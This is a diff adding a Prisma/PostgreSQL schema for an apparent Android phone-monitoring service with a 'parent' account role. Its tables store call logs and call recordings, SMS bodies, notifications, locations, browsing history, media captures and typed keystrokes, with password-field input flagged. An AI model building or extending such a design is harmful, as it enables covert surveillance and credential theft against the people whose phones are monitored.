@@ -1,0 +1,152 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+model User {
+  id           String   @id @default(cuid())
+  email        String   @unique
+  passwordHash String
+  role         String   @default("parent")
+  isActive     Boolean  @default(true)
+  createdAt    DateTime @default(now())
+  updatedAt    DateTime @updatedAt
+  devices      Device[]
+}
+
+model Device {
+  id            String         @id @default(cuid())
+  userId        String
+  user          User           @relation(fields: [userId], references: [id], onDelete: Cascade)
+  deviceName    String
+  androidId     String         @unique
+  deviceToken   String         @unique
+  apkVersion    String         @default("1.0.0")
+  lastSeen      DateTime?
+  isActive      Boolean        @default(true)
+  createdAt     DateTime       @default(now())
+  callLogs      CallLog[]
+  smsMessages   SmsMessage[]
+  notifications Notification[]
+  locations     Location[]
+  appUsages     AppUsage[]
+  webHistories  WebHistory[]
+  inputLogs     InputLog[]
+  mediaCaptures MediaCapture[]
+
+  @@index([userId])
+}
+
+model CallLog {
+  id              String   @id @default(cuid())
+  deviceId        String
+  device          Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  number          String
+  contactName     String?
+  type            String
+  durationSeconds Int      @default(0)
+  recordedFileUrl String?
+  timestamp       DateTime
+  createdAt       DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+model SmsMessage {
+  id        String   @id @default(cuid())
+  deviceId  String
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  address   String
+  body      String
+  type      String
+  timestamp DateTime
+  createdAt DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+model Notification {
+  id          String   @id @default(cuid())
+  deviceId    String
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  appPackage  String
+  appName     String?
+  title       String?
+  text        String?
+  timestamp   DateTime
+  createdAt   DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+model Location {
+  id        String   @id @default(cuid())
+  deviceId  String
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  latitude  Float
+  longitude Float
+  accuracy  Float?
+  timestamp DateTime
+  createdAt DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+model AppUsage {
+  id              String   @id @default(cuid())
+  deviceId        String
+  device          Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  packageName     String
+  appName         String?
+  usageMinutes    Int
+  date            DateTime
+  createdAt       DateTime @default(now())
+
+  @@unique([deviceId, packageName, date])
+  @@index([deviceId, date])
+}
+
+model WebHistory {
+  id             String   @id @default(cuid())
+  deviceId       String
+  device         Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  url            String
+  title          String?
+  browserPackage String
+  browserName    String?
+  timestamp      DateTime
+  createdAt      DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+model InputLog {
+  id              String   @id @default(cuid())
+  deviceId        String
+  device          Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  appPackage      String
+  appName         String?
+  fieldName       String?
+  text            String
+  isPasswordField Boolean  @default(false)
+  timestamp       DateTime
+  createdAt       DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
+
+model MediaCapture {
+  id        String   @id @default(cuid())
+  deviceId  String
+  device    Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  type      String
+  fileUrl   String
+  timestamp DateTime
+  createdAt DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+}
